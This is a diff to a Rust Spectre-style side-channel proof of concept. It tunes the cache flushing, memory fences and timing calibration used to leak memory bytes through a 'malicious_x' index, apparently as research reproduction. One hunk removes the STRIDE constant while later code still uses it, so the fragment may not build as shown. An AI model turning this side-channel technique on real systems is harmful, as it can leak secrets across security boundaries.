@@ -28,7 +28,6 @@ const THRESHOLD: u64 = 80;
 #[cfg(all(target_arch = "wasm32"))]
 const THRESHOLD: u64 = 470;
 */
-const STRIDE: usize = 512;
 
 const data_size: usize = 11;
 static mut public_data: [u8; 160] = [2; 160];
@@ -81,16 +80,11 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
     let tries = std::env::var("TRIES").unwrap_or("5000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     for i in 0..tries {
-        /*#[cfg(feature = "tracing")]
-        {
-            eprint!("[");
-        }*/
-        for i in 0..256 {
-            // latencies[i] = 0;
-        }
-        // flush lines clflush
-        // PRIME
         for j in 0..256 {
+            unsafe {
+                _mm_mfence();
+            }
+
             #[cfg(all(target_arch = "x86_64"))]
             unsafe {
                 _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
@@ -101,8 +95,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             }
         }
         // Wait a little to the cache to flush
-        for _ in 0..100000 {}
-        // TODO watch out for the optimization of this empty loop
+        //for _ in 0..100 {}
         unsafe {
             _mm_mfence();
         }
@@ -211,8 +204,8 @@ pub fn main() {
         public_data[15] = 16;
     }
 
-    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction);
     for j in 0..11 {
+        let (hit, miss) = reproduction::get_cache_time(&array_for_prediction);
         let (score, value) = read_memory_byte(j, hit, miss);
         // get value 0 as char
         let ch = value[0] as u8 as char;
